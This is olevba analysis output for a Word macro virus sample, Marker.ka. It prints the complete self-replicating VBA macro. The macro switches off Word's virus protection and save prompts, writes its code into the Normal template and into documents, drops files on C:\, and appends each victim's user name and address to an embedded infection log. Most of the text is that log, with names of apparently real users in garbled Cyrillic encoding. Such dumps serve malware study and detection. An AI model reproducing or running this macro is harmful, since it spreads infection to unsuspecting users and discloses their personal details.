olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Marker.ka
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Marker.ka - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
UserForm1.Show
End Sub
Private Sub CommandButton1_Click()
ListBox1.Text1 = "a"
End Sub

' DSR & FHS , KZ, Kostanai
' KGU-EMF by DSR & FHS v0.1
Private Sub Document_Close()

On Error Resume Next

'Declare Variables
Dim SaveDocument, SaveNormalTemplate, DocumentInfected, NormalTemplateInfected As Boolean
Dim ad, nt As Object
Dim OurCode, UserAddress, LogData, LogFile As String

'Initialize Variables
Set ad = ActiveDocument.VBProject.VBComponents.Item(1)
Set nt = NormalTemplate.VBProject.VBComponents.Item(1)

DocumentInfected = ad.CodeModule.Find("' DSR & FHS , KZ, Kostanai", 1, 1, 10, 10)
NormalTemplateInfected = nt.CodeModule.Find("' DSR & FHS , KZ, Kostanai", 1, 1, 10, 10)

'Switch the VirusProtection OFF, ConfirmConversion OFF, SaveNormalPrompt OFF
    Options.VirusProtection = False
    Options.ConfirmConversions = False
    Options.SaveNormalPrompt = False


  If (Day(Now()) <> 1) And (System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "LogFile") = False) Then
  
    If DocumentInfected = True Then
      LogData = ad.CodeModule.Lines(1, ad.CodeModule.CountOfLines)
    ElseIf NormalTemplateInfected = True Then
      LogData = nt.CodeModule.Lines(1, nt.CodeModule.CountOfLines)
    End If
    
    LogData = Mid(LogData, InStr(1, LogData, "' Log" & "file -->"), Len(LogData) - InStr(1, LogData, "' Log" & "file -->"))
    
    LogFile = LogFile + Mid(Str(Int(8 * Rnd)), 2, 1)
    LogFile = "C:\bootlog" & LogFile & ".sys"
    
    Open LogFile For Output As #1
    Print #1, LogData
    Close #1
    
    Open "c:\netlog.sys" For Output As #1
    Print #1, "For YOU"
    Print #1, "SCOOTER"
    Print #1, "Wellcome to Calipso"
    Print #1, "FasterHarderScooter"
    Print #1, "Scooter on the Web: www.scooterweb.de"
    Print #1, "Wiritten by FHS & DSR (KZ, Kostanai town, KGU)"
    Print #1, "This is a simple example"
    Print #1, "read " & LogFile
    Close #1
    
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "LogFile") = True
    
  End If


'Make sure that some conditions are true before we continue infecting anything
If ((DocumentInfected = True) And _
   (ActiveDocument.SaveFormat = wdFormatDocument Or _
   ActiveDocument.SaveFormat = wdFormatTemplate)) Or _
   ((NormalTemplateInfected = True) And _
   (ActiveDocument.SaveFormat = wdFormatDocument Or _
   ActiveDocument.SaveFormat = wdFormatTemplate)) Then
   
   
  'Infect the NormalTemplate
  If DocumentInfected = True Then
  
    SaveNormalTemplate = NormalTemplate.Saved
  
    OurCode = ad.CodeModule.Lines(1, ad.CodeModule.CountOfLines)

    
    'Write a log file of this NormalTemplate infection
    For i = 1 To Len(Application.UserAddress)
      If Mid(Application.UserAddress, i, 1) <> Chr(13) Then
        If Mid(Application.UserAddress, i, 1) <> Chr(10) Then
          UserAddress = UserAddress & Mid(Application.UserAddress, i, 1)
        End If
      Else
        UserAddress = UserAddress & Chr(13) & "' "
      End If
    Next i

    OurCode = OurCode & Chr(13) & _
              "' " & "* DSR & FHS , KGU EMF" & Chr(13) & _
              "' " & "00:15:54  -  Wednesday, 22.12.1999" & Chr(13) & _
              "' " & "KZ, Kostanai, KGU EMF Applied Mathematics" & Chr(13) & _
              "' " & Format(Time, "hh:mm:ss - ") & _
                     Format(Date, "dddd, d mmm yyyy") & Chr(13) & _
              "' " & Application.UserName & Chr(13) & _
              "' " & UserAddress & Chr(13)


    nt.CodeModule.deletelines 1, nt.CodeModule.CountOfLines
    nt.CodeModule.AddFromString OurCode
    
    If SaveNormalTemplate = True Then NormalTemplate.Save
    
  End If


  'Infect the ActiveDocument
  If NormalTemplateInfected = True And _
     DocumentInfected = False Then
  
    SaveDocument = ActiveDocument.Saved
    
    OurCode = nt.CodeModule.Lines(1, nt.CodeModule.CountOfLines)

    ad.CodeModule.deletelines 1, ad.CodeModule.CountOfLines
    ad.CodeModule.AddFromString OurCode
    
    If SaveDocument = True Then ActiveDocument.Save
      
  End If
  
    
End If

End Sub

' Logfile -->

' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 19:20:14 - ñðåäà, 3 ìàé 2000
' Ïîæåëàë  îñòàòüñÿ íåèçâåñòíûì
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 11:36:42 - âîñêðåñåíüå, 14 ìàé 2000
' Khudyakov Yuriy
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 16:27:56 - ïîíåäåëüíèê, 15 ìàé 2000
' Õóäÿêîâà
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 16:55:46 - âòîðíèê, 16 ìàé 2000
' Õóäÿêîâà
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 10:25:20 - ñðåäà, 17 ìàé 2000
' Õóäÿêîâà
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 10:48:08 - ñðåäà, 17 ìàé 2000
' Õóäÿêîâà
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 10:53:13 - ñðåäà, 17 ìàé 2000
' Õóäÿêîâà
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 15:46:39 - ñðåäà, 17 ìàé 2000
' Õóäÿêîâà
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 15:10:05 - ÷åòâåðã, 18 ìàé 2000
' Õóäÿêîâà
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 14:57:33 - âòîðíèê, 23 ìàé 2000
' Õóäÿêîâà
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 16:42:02 - âòîðíèê, 23 ìàé 2000
' Õóäÿêîâà
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 10:13:04 - ñðåäà, 24 ìàé 2000
' Õóäÿêîâà
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 10:51:44 - ñóááîòà, 17 èþí 2000
' Reanimator 98
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 10:56:16 - ñóááîòà, 17 èþí 2000
' Reanimator 98
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 10:57:13 - ñóááîòà, 17 èþí 2000
' Reanimator 98
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 12:11:33 - ñóááîòà, 17 èþí 2000
' Reanimator 98
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 13:26:34 - ïîíåäåëüíèê, 19 èþí 2000
' Reanimator 98
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 13:33:11 - âòîðíèê, 27 èþí 2000
' Ñ.Õ. Åñåíáàåâ
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 14:13:47 - âòîðíèê, 27 èþí 2000
' Ñ.Õ. Åñåíáàåâ
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 14:49:56 - ñðåäà, 28 èþí 2000
' Indi G.Ospanova
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 14:12:22 - ïîíåäåëüíèê, 17 èþë 2000
' Àëåêñàíäð
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 14:16:56 - ïîíåäåëüíèê, 17 èþë 2000
' Àëåêñàíäð
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 18:26:40 - âòîðíèê, 18 èþë 2000
'  Àëåêñàíäð
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 08:22:23 - ÷åòâåðã, 20 èþë 2000
'  Àëåêñàíäð
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 10:33:06 - ÷åòâåðã, 20 èþë 2000
'  Àëåêñàíäð
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 18:08:01 - ÷åòâåðã, 20 èþë 2000
'  Àëåêñàíäð
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 10:34:42 - âîñêðåñåíüå, 23 èþë 2000
'  Àëåêñàíäð
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 11:45:27 - âîñêðåñåíüå, 23 èþë 2000
'  Àëåêñàíäð
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 11:53:05 - âòîðíèê, 25 èþë 2000
' CCTT
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 08:53:34 - ÷åòâåðã, 27 èþë 2000
' ðåàíèìàòîð
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 17:37:06 - âòîðíèê, 1 àâã 2000
' Reanimator 99 CD
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 12:46:13 - ñðåäà, 2 àâã 2000
' Reanimator 99 CD
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 18:22:38 - ñðåäà, 2 àâã 2000
' Reanimator 99 CD
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 09:11:48 - ïîíåäåëüíèê, 21 àâã 2000
' Reanimator 99 CD
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 15:01:19 - ïîíåäåëüíèê, 21 àâã 2000
' Reanimator 99 CD
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 09:38:46 - âòîðíèê, 22 àâã 2000
' Reanimator 99 CD
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 11:14:24 - ïÿòíèöà, 25 àâã 2000
' Reanimator 99 CD
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 09:43:34 - ïÿòíèöà, 22 ñåí 2000
' Reanimator 99 CD
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 13:22:22 - ïÿòíèöà, 22 ñåí 2000
' Reanimator 99 CD
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 11:14:55 - âòîðíèê, 10 îêò 2000
' 1
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 21:48:10 - ÷åòâåðã, 19 îêò 2000
' 1
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 16:24:45 - ñðåäà, 29 íîÿ 2000
' 1
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 09:23:28 - ÷åòâåðã, 30 íîÿ 2000
' 1
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 11:58:47 - ÷åòâåðã, 30 íîÿ 2000
' 1
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 11:36:47 - ïÿòíèöà, 1 äåê 2000
' 1
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 13:23:31 - ïÿòíèöà, 5 ÿíâ 2001
' Serg
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 11:54:34 - ïîíåäåëüíèê, 8 ÿíâ 2001
' Serg
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 14:36:35 - âòîðíèê, 9 ÿíâ 2001
' áâã¤
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 15:05:48 - âòîðíèê, 9 ÿíâ 2001
' áâã¤
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 18:23:03 - âòîðíèê, 9 ÿíâ 2001
' áâã¤
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 10:32:55 - ñðåäà, 10 ÿíâ 2001
' áâã¤
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 09:33:04 - ïÿòíèöà, 12 ÿíâ 2001
' áâã¤
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 13:48:13 - ïÿòíèöà, 12 ÿíâ 2001
' áâã¤
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 01:03:22 - ïîíåäåëüíèê, 15 ÿíâ 2001
' Jordan
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 18:08:12 - ïÿòíèöà, 2 ôåâ 2001
' Serg
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 17:49:01 - ïÿòíèöà, 16 ôåâ 2001
' Serg
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 13:12:13 - ñóááîòà, 17 ôåâ 2001
' Alex
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 13:35:12 - ñóááîòà, 17 ôåâ 2001
' Alex
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 13:35:19 - ñóááîòà, 17 ôåâ 2001
' Alex
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 13:35:26 - ñóááîòà, 17 ôåâ 2001
' Alex
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 13:35:31 - ñóááîòà, 17 ôåâ 2001
' Alex
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 13:35:37 - ñóááîòà, 17 ôåâ 2001
' Alex
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 13:35:44 - ñóááîòà, 17 ôåâ 2001
' Alex
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 13:35:49 - ñóááîòà, 17 ôåâ 2001
' Alex
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 13:35:55 - ñóááîòà, 17 ôåâ 2001
' Alex
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 13:36:01 - ñóááîòà, 17 ôåâ 2001
' Alex
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 13:45:17 - ñóááîòà, 17 ôåâ 2001
' Alex
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 13:49:57 - ñóááîòà, 17 ôåâ 2001
' Alex
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 14:40:56 - ñóááîòà, 17 ôåâ 2001
' Alex
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 14:41:22 - ñóááîòà, 17 ôåâ 2001
' Alex
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 16:51:31 - ñóááîòà, 17 ôåâ 2001
' Alex
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 12:45:33 - ïîíåäåëüíèê, 19 ôåâ 2001
' Alex
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 15:22:59 - ïîíåäåëüíèê, 19 ôåâ 2001
' Alex
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 12:21:21 - ñðåäà, 14 ìàð 2001
' User6
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 12:24:42 - ñðåäà, 14 ìàð 2001
' User6
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 13:01:34 - ñðåäà, 14 ìàð 2001
' User6
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 14:21:03 - ñðåäà, 14 ìàð 2001
' User6
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 14:51:41 - ñðåäà, 14 ìàð 2001
' User6
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 13:53:57 - ñðåäà, 14 ìàð 2001
' User6
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 11:09:33 - ïîíåäåëüíèê, 27 ìàð 2000
' Òàëãàò
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 11:22:54 - ÷åòâåðã, 29 ìàð 2001
' Pentium
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 12:06:03 - ÷åòâåðã, 29 ìàð 2001
' Pentium
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 12:09:07 - ÷åòâåðã, 29 ìàð 2001
' Pentium
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 12:09:42 - ÷åòâåðã, 29 ìàð 2001
' Pentium
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 12:10:18 - ÷åòâåðã, 29 ìàð 2001
' Pentium
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 12:14:22 - ÷åòâåðã, 29 ìàð 2001
' Pentium
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 12:15:02 - ÷åòâåðã, 29 ìàð 2001
' Pentium
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 12:21:20 - ÷åòâåðã, 29 ìàð 2001
' Pentium
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 12:24:37 - ÷åòâåðã, 29 ìàð 2001
' Pentium
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 12:27:06 - ÷åòâåðã, 29 ìàð 2001
' Pentium
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 12:28:10 - ÷åòâåðã, 29 ìàð 2001
' Pentium
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 12:29:59 - ÷åòâåðã, 29 ìàð 2001
' Pentium
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 12:31:30 - ÷åòâåðã, 29 ìàð 2001
' Pentium
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 13:29:37 - ÷åòâåðã, 29 ìàð 2001
' Pentium
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 13:31:21 - ÷åòâåðã, 29 ìàð 2001
' Pentium
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 15:10:55 - ÷åòâåðã, 29 ìàð 2001
' Pentium
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 15:52:34 - ÷åòâåðã, 29 ìàð 2001
' Pentium
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 16:05:57 - ÷åòâåðã, 29 ìàð 2001
' Pentium
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 16:08:41 - ÷åòâåðã, 29 ìàð 2001
' Pentium
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 16:22:21 - ÷åòâåðã, 29 ìàð 2001
' Pentium
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 11:22:20 - ïÿòíèöà, 30 ìàð 2001
' Pentium
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 11:23:21 - ïÿòíèöà, 30 ìàð 2001
' Pentium
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 08:38:16 - ïîíåäåëüíèê, 2 àïð 2001
' Pentium
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 08:47:00 - ïîíåäåëüíèê, 2 àïð 2001
' Pentium
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 10:15:45 - ïîíåäåëüíèê, 2 àïð 2001
' Pentium
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 10:16:38 - ïîíåäåëüíèê, 2 àïð 2001
' Pentium
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 10:42:56 - âòîðíèê, 3 àïð 2001
' Pentium
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 11:25:46 - âòîðíèê, 3 àïð 2001
' Pentium
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 11:29:29 - âòîðíèê, 3 àïð 2001
' Pentium
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 22:11:17 - ñðåäà, 4 àïð 2001
' Ðàõìåòîâ Ìàðàò
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 22:13:02 - ñðåäà, 4 àïð 2001
' Ðàõìåòîâ Ìàðàò
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 22:27:52 - ñðåäà, 4 àïð 2001
' Ðàõìåòîâ Ìàðàò
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 23:05:37 - ñðåäà, 4 àïð 2001
' Ðàõìåòîâ Ìàðàò
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 09:31:02 - ÷åòâåðã, 5 àïð 2001
' Ðàõìåòîâ Ìàðàò
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 09:41:43 - ÷åòâåðã, 5 àïð 2001
' Ðàõìåòîâ Ìàðàò
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 09:43:49 - ÷åòâåðã, 5 àïð 2001
' Ðàõìåòîâ Ìàðàò
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 09:45:18 - ÷åòâåðã, 5 àïð 2001
' Ðàõìåòîâ Ìàðàò
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 09:47:36 - ÷åòâåðã, 5 àïð 2001
' Ðàõìåòîâ Ìàðàò
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
